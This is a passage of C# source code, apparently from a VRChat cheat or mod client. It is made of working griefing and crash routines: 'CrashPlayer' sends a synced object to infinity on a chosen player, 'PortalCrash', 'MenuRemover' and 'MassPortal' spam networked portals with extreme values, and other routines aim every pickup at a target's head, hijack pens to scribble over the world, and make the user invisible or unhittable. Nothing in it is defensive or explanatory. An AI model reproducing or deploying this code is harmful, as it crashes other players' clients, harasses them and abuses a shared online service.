            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                Pickup.ThrowVelocityBoostScale = int.MaxValue;
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                for (int I = 0; I < 40; I++)
                {
                    Pickup.gameObject.transform.position = new Vector3(0, 1, 0);
                    yield return new WaitForSeconds(0.1f);
                    Pickup.gameObject.transform.position = new Vector3(0, 2, 0);
                    yield return new WaitForSeconds(0.1f);
                }
            }
            yield break;
        }

        public static IEnumerator Collapse(VRC_Pickup Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                Pickup.ThrowVelocityBoostScale = int.MaxValue;
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                for (int I = 0; I < 40; I++)
                {
                    Pickup.gameObject.transform.position = new Vector3(0, 1, 0);
                    yield return new WaitForSeconds(0.1f);
                    Pickup.gameObject.transform.position = new Vector3(0, 2, 0);
                    yield return new WaitForSeconds(0.1f);
                }
            }
            yield break;
        }

        public static IEnumerator Collapse(VRC_ObjectSync Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                for (int I = 0; I < 40; I++)
                {
                    Pickup.gameObject.transform.position = new Vector3(0, 1, 0);
                    yield return new WaitForSeconds(0.1f);
                    Pickup.gameObject.transform.position = new Vector3(0, 2, 0);
                    yield return new WaitForSeconds(0.1f);
                }
            }
            yield break;
        }
#endregion

        #region FreeFall Pickup
        public static IEnumerator FreeFallPickup(VRCPickup Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }

        public static IEnumerator FreeFallPickup(VRC_Pickup Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }

        public static IEnumerator FreeFallPickup(VRC_ObjectSync Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                if (!Pickup.name.ToLower().Contains("viewdinder") && !Pickup.name.ToLower().Contains("avatardebugconsole")) Pickup.gameObject.SetActive(true);
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }
#endregion

        public static void ChangePedestals()
        {
            foreach (VRC.SDKBase.VRC_AvatarPedestal vrc_AvatarPedestal in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_AvatarPedestal>())
            {
                Networking.RPC(RPC.Destination.All, vrc_AvatarPedestal.gameObject, "SwitchAvatar", new Il2CppSystem.Object[]
                {
                    Settings.CCDIK
                });
            }
        }

        public static void Invisible()
        {
            var IKComponent = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRCVrIkController>();
            IKComponent.field_Private_VRIK_0.solver.bodyOffset = new Vector3(9, 0,9);
            for (int i = 0; i < 20; i++)
            {
                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = new Vector3(999999999999 * 2, 999999999999 * 2, 999999999999 * 2);
                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = new Vector3(999999999999 * 2, 999999999999 * 2, 999999999999 * 2);
                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = new Vector3(999999999999 * 2, 999999999999 * 2, 999999999999 * 2);
                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = new Vector3(999999999999 * 2, 999999999999 * 2, 999999999999 * 2);
                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = new Vector3(999999999999 * 2, 999999999999 * 2, 999999999999 * 2);
            }
        }

        public static void KnifeShield()
        {
            List<GameObject> Knifes = new List<GameObject>()
            {
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (0)").gameObject,
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (1)").gameObject,
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (2)").gameObject,
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (3)").gameObject,
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (4)").gameObject,
                GameObject.Find("Game Logic").transform.Find("Weapons/Knife (5)").gameObject,
            };
            GameObject gameObject = new GameObject();
            Transform transform = gameObject.transform;
            transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.35f, 0f);
            gameObject.transform.Rotate(new Vector3(0f, 360f * Time.time, 0f));
            foreach (var Knife in Knifes)
            {
                Functions.TakeOwnershipIfNecessary(Knife.gameObject);
                Knife.transform.position = gameObject.transform.position + gameObject.transform.forward;
                Knife.transform.LookAt(VRCPlayer.field_Internal_Static_VRCPlayer_0.transform);
                gameObject.transform.Rotate(new Vector3(0f, (float) (360 / Knifes.Count), 0f));
            }
            UnityEngine.Object.Destroy(gameObject);
            gameObject = null;
            transform = null;
        }

        public static VRCPlayer SelectedTarget;
        public static string Bone = "None";
        public static void SpamPickups()
        {
            if (SelectedTarget == null) return;
            if (Bone == "Head")
            {
                List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
                if (AllPickups != null)
                {
                    foreach (VRC_Pickup obj in AllPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(obj.gameObject);
                        obj.transform.position = SelectedTarget.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                        obj.transform.LookAt(SelectedTarget.transform);
                    }
                }
                List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
                if (AllUdonPickups != null)
                {
                    foreach (VRCPickup obj in AllUdonPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(obj.gameObject);
                        obj.transform.position = SelectedTarget.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                        obj.transform.LookAt(SelectedTarget.transform);
                    }
                }
            }

            if (Bone == "Feet")
            {
                List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
                if (AllPickups != null)
                {
                    foreach (VRC_Pickup obj in AllPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(obj.gameObject);
                        obj.transform.position = SelectedTarget.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.LeftFoot);
                        obj.transform.LookAt(SelectedTarget.transform);
                    }
                }
                List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
                if (AllUdonPickups != null)
                {
                    foreach (VRCPickup obj in AllUdonPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(obj.gameObject);
                        obj.transform.position = SelectedTarget.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.LeftFoot);
                        obj.transform.LookAt(SelectedTarget.transform);
                    }
                }
            }
        }

        public static void TargetItemOrbit()
        {
            if (SelectedTarget == null) return;
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                GameObject gameObject = new GameObject();
                Transform transform = gameObject.transform;
                transform.position = SelectedTarget.transform.position + new Vector3(0f, 0.35f, 0f);
                gameObject.transform.Rotate(new Vector3(0f, 360f * Time.time, 0f));
                foreach (VRC_Pickup obj in AllPickups)
                {
                    Functions.TakeOwnershipIfNecessary(obj.gameObject);
                    obj.transform.position = gameObject.transform.position + gameObject.transform.forward;
                    obj.transform.LookAt(SelectedTarget.transform);
                    gameObject.transform.Rotate(new Vector3(0f, (float) (360 / AllPickups.Count), 0f));
                }
                UnityEngine.Object.Destroy(gameObject);
                gameObject = null;
                transform = null;
            }
            List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
            if (AllUdonPickups != null)
            {
                GameObject gameObject = new GameObject();
                Transform transform = gameObject.transform;
                transform.position = SelectedTarget.transform.position + new Vector3(0f, 0.35f, 0f);
                gameObject.transform.Rotate(new Vector3(0f, 360f * Time.time, 0f));
                foreach (VRCPickup obj in AllUdonPickups)
                {
                    Functions.TakeOwnershipIfNecessary(obj.gameObject);
                    obj.transform.position = gameObject.transform.position + gameObject.transform.forward;
                    obj.transform.LookAt(SelectedTarget.transform);
                    gameObject.transform.Rotate(new Vector3(0f, (float) (360 / AllUdonPickups.Count), 0f));
                }
                UnityEngine.Object.Destroy(gameObject);
                gameObject = null;
                transform = null;
            }
        }

        private static Transform head;
        private static VRC_AnimationController animController;
        private static VRCVrIkController ikController;

        public static void NoHitbox(bool state)
        {
            if (VRCPlayer.field_Internal_Static_VRCPlayer_0 != null) return;
            if (head == null) head = VRCVrCamera.field_Private_Static_VRCVrCamera_0.transform.parent;
            if (animController == null) animController = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRC_AnimationController>();
            if (ikController == null) ikController = VRCPlayer.field_Internal_Static_VRCPlayer_0.GetComponentInChildren<VRCVrIkController>();
            VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position += new Vector3(0f, (float)(state ? -4 : 4), 0f);
            animController.field_Private_Boolean_0 = !state;
            ikController.field_Private_Boolean_0 = true;
            if (state)
            {
                head.localPosition += new Vector3(0f, 4f / head.parent.transform.localScale.y, 0f);
                return;
            }
            head.localPosition = Vector3.zero;
        }
        public static IEnumerator CrashPlayer(VRC_ObjectSync pickup, VRC.Player player)
        {
            Networking.SetOwner(Networking.LocalPlayer, pickup.gameObject);
            int num;
            for (int i = 0; i < 90; i = num + 1)
            {
                pickup.transform.position = player.transform.position;
                pickup.transform.rotation = Quaternion.Euler(0f, 0f, 0f);
                yield return null;
                num = i;
            }
            pickup.gameObject.transform.position = new Vector3(pickup.transform.position.x, Vector3.positiveInfinity.y, pickup.transform.rotation.z);
            yield break;
        }

        public static bool OwnerShip = false;

        public static IEnumerator AntiTheft()
        {
            while (Settings.AntiTheft)
            {
                try
                {
                    foreach (var Pickup in AllPickups)
                    {
                        if (Pickup != null) Networking.GetOwner(Pickup.gameObject);
                    }

                    foreach (var Pickup in AllUdonPickups)
                    {
                        if (Pickup != null) Networking.GetOwner(Pickup.gameObject);
                    }

                    foreach (var Pickup in AllSyncPickups)
                    {
                        if (Pickup != null) Networking.GetOwner(Pickup.gameObject);
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
            yield break;
        }

        public static IEnumerator PickupsOrbit()
        {
            var Object= new GameObject();
            float Speed = 0;
            bool MaxSpeed = false;
            float Distance = 0.03f;

            while (Settings.ItemsOrbit)
            {
                yield return new WaitForSeconds(0.01f);

                if (!MaxSpeed)
                {
                    Speed += 0.01f;
                    Distance += 0.005f;
                    if (Speed > 3) MaxSpeed = true;
                }
                else
                {
                    Speed -= 0.01f;
                    Distance -= 0.005f;
                    if (Speed <= -3) MaxSpeed = false;
                }

                Object.transform.position = Vector3.Lerp(Object.transform.position, VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Hips), Time.deltaTime * 3.3f);
                Object.transform.Rotate(new Vector3(0f, Speed, 0f));

                foreach (var Pickup in AllPickups)
                {
                    var Collider = Pickup.GetComponent<Collider>();
                    if (Collider != null) Collider.enabled = false;
                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                    Pickup.transform.position = Object.transform.position + Object.transform.forward * Distance;
                    Pickup.transform.LookAt(VRCPlayer.field_Internal_Static_VRCPlayer_0.transform);
                    Object.transform.Rotate(new Vector3(0f, 360f / AllPickups.Count, 0f));
                }

                foreach (var Pickup in AllUdonPickups)
                {
                    var Collider = Pickup.GetComponent<Collider>();
                    if (Collider != null) Collider.enabled = false;
                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                    Pickup.transform.position = Object.transform.position + Object.transform.forward * Distance;
                    Object.transform.Rotate(new Vector3(0f, 360f / AllUdonPickups.Count, 0f));
                }

                foreach (var Pickup in AllSyncPickups)
                {
                    var Collider = Pickup.GetComponent<Collider>();
                    if (Collider != null) Collider.enabled = false;
                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                    Pickup.transform.position = Object.transform.position + Object.transform.forward * Distance;
                    Object.transform.Rotate(new Vector3(0f, 360f / AllSyncPickups.Count, 0f));
                }
            }

            foreach (var Pickup in AllPickups)
            {
                var Collider = Pickup.GetComponent<Collider>();
                if (Collider != null) Collider.enabled = true;
            }

            foreach (var Pickup in AllUdonPickups)
            {
                var Collider = Pickup.GetComponent<Collider>();
                if (Collider != null) Collider.enabled = true;
            }

            foreach (var Pickup in AllSyncPickups)
            {
                var Collider = Pickup.GetComponent<Collider>();
                if (Collider != null) Collider.enabled = true;
            }

            UnityEngine.Object.Destroy(Object);
            yield break;
        }
        
        public static IEnumerator AutoDropItems()
        {
            while (true)
            {
                if (Settings.AutoDrop)
                {
                    List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
                    List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
                    if (AllPickups != null)
                    {
                        foreach (var Pickup in AllPickups)
                        {
                            if (Pickup.IsHeld)
                            {
                                Player currentplayer = Wrappers.Utils.PlayerManager.GetPlayerWithPlayerID(Pickup.currentPlayer.playerId);
                                if (currentplayer.UserID() != APIUser.CurrentUser.id)
                                {
                                    EvoVrConsole.Log(EvoVrConsole.LogsType.Info, currentplayer.DisplayName() + " Tried picking up " + Pickup.name);
                                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                                    Pickup.Drop();
                                }
                                currentplayer = null;
                            }
                        }
                    }

                    if (AllUdonPickups != null)
                    {
                        foreach (var Pickup in AllUdonPickups)
                        {
                            if (Pickup.IsHeld)
                            {
                                Player currentplayer = Wrappers.Utils.PlayerManager.GetPlayerWithPlayerID(Pickup.currentPlayer.playerId);
                                if (currentplayer.UserID() != APIUser.CurrentUser.id)
                                {
                                    EvoVrConsole.Log(EvoVrConsole.LogsType.Info, currentplayer.DisplayName() + " Tried picking up " + Pickup.name);
                                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                                    Pickup.Drop();
                                }
                                currentplayer = null;
                            }
                        }
                    }
                }
                yield return new WaitForSeconds(0.5f);
            }
        }

        public static IEnumerator PortalCrash()
        {
            while (true)
            {
                yield return new WaitForSeconds(1);
                if (Settings.PortalCrash)
                {
                    GameObject InfPortal3 = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", new Vector3(Utils.Utilities.RandomNumber(2), Utils.Utilities.RandomNumber(2), Utils.Utilities.RandomNumber(2)) * 268, Quaternion.identity);
                    Networking.RPC(RPC.Destination.AllBufferOne, InfPortal3, "ConfigurePortal", new Il2CppSystem.Object[]
                    {
                    (Il2CppSystem.String)Utils.Utilities.RandomNumberString(2),
                    (Il2CppSystem.String)Utils.Utilities.RandomNumberString(2),
                    new Il2CppSystem.Int32
                    {
                        m_value = new System.Random().Next(int.MinValue,int.MaxValue)
                    }.BoxIl2CppObject()
                    });
                }
                yield return new WaitForEndOfFrame();
            }
        }

        internal static void SetTimer(float timee)
        {
            if (UnityEngine.Object.FindObjectsOfType<PortalInternal>() == null)
            {
                return;
            }
            Il2CppSystem.Single single = default(Il2CppSystem.Single);
            single.m_value = timee;
            Il2CppSystem.Object @object = single.BoxIl2CppObject();
            PortalTrigger[] array = UnityEngine.Resources.FindObjectsOfTypeAll<PortalTrigger>();
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i].gameObject.activeInHierarchy && !(array[i].gameObject.GetComponentInParent<VRC.SDKBase.VRC_PortalMarker>() != null))
                {
                    Networking.RPC(RPC.Destination.AllBufferOne, array[i].gameObject, "SetTimerRPC", new Il2CppSystem.Object[]
                    {
                        @object
                    });
                }
            }
        }

        internal static IEnumerator MenuRemover()
        {
            while (true)
            {
                if (Settings.MenuRemover)
                {
                    yield return new WaitForSeconds(0.3f);
                    Functions.DropPortal("wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc", Utils.Utilities.RandomNumberString(5), int.MinValue, new Vector3(3.402823e+38f, 3.402823e+38f, 3.402823e+38f), new Quaternion(0, 0, 0, 0));
                    SetTimer(float.PositiveInfinity);
                    yield return new WaitForSeconds(0.3f);
                }
                yield return new WaitForEndOfFrame();
            }
        }

        internal static IEnumerator MassPortal()
        {
            var Worlds = new List<string>()
            {
                "wrld_4432ea9b-729c-46e3-8eaf-846aa0a37fdd",
                "wrld_4a65ba53-d8df-40a7-b67d-30c63bff0e95",
                "wrld_a6e75419-0f76-402b-966e-3dc8b79a6b30",
                "wrld_7e10376a-29b6-43af-ac5d-6eb72732e90c",
                "wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc",
                "wrld_9c40ca9d-216d-46d1-baa7-e1117df7d026",
                "wrld_22f799b8-7c8d-4302-aee3-35686dfb2590",
            };

            while (Settings.MassPortal)
            {
                yield return new WaitForSeconds(0.2f);
                var X = new System.Random().Next(-20, 20);
                yield return new WaitForSeconds(0.5f);
                var Y = new System.Random().Next(-20, 20);
                yield return new WaitForSeconds(0.5f);
                var Z = new System.Random().Next(-20, 20);
                Functions.DropPortal(Worlds[new System.Random().Next(0, Worlds.Count - 1)], Utils.Utilities.RandomNumberString(5), new System.Random().Next(int.MinValue, int.MaxValue), new Vector3(X, Y, Z), Quaternion.identity);
                SetTimer(float.PositiveInfinity);
            }
            yield break;
        }

        public static List<string> PenNames = new List<string>()
        {
            "pen",
            "marker",
            "grip"
        };
        public static IEnumerator SpreadVirus()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                foreach (var Pickup in AllPickups)
                {
                    foreach (var PenName in PenNames)
                    {
                        if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.Drop();
                            var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                            var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();
                            if (BaseTriger!= null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            yield return new WaitForSeconds(0.2f);
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            yield return new WaitForSeconds(0.2f); //Figured out that you need a delay or else the use down rpc send before all the OnPickup events are sent and it won't work
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown(); //But calling it only once and it won't stop drawing until it's dropped or useup so it's not sending any RPC and not causing lags
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                            Pickup.transform.position = new Vector3(0, 0, 0);
                        }
                    }
                }
                float a = 0f;
                float b = 0f;
#pragma warning disable CS0219 // La variable 'y' est assignée, mais sa valeur n'est jamais utilisée
                float y = 0f;
#pragma warning restore CS0219 // La variable 'y' est assignée, mais sa valeur n'est jamais utilisée
                for (int i = 0; i < 2000; i++)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        foreach (var PenName in PenNames)
                        {
                            if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                            {
                                yield return new WaitForSeconds(0.01f);
                                float CircleSpeed = 9999;
                                float alpha = 0f;
                                Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                                for (int x = 0; x < 4000; x++)
                                {
                                    alpha += Time.deltaTime * CircleSpeed;
                                    Pickup.transform.position = new Vector3(0 + a * (float) System.Math.Cos(alpha), 0 + 0.3f, 0 + b * (float) System.Math.Sin(alpha));
                                }
                                a += 0.003f;
                                b += 0.003f;
                            }
                        }
                    }
                }
            }
        }


        public static IEnumerator SpreadVirus2()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                float a = 0f;
                float b = 0f;
                float y = 0.5f;
                foreach (var Pickup in AllPickups)
                {
                    foreach (var PenName in PenNames)
                    {
                        if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.Drop();
                            var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                            var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            yield return new WaitForSeconds(0.2f);
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            yield return new WaitForSeconds(0.2f); //Figured out that you need a delay or else the use down rpc send before all the OnPickup events are sent and it won't work
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown(); //But calling it only once and it won't stop drawing until it's dropped or useup so it's not sending any RPC and not causing lags
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                            Pickup.transform.position = new Vector3(0, 0, 0);
                            IEnumerator Orbit()
                            {
                                while (true)
                                {
                                    yield return new WaitForEndOfFrame();
                                    if (Pickup != null)
                                    {
                                        GameObject gameObject = new GameObject();
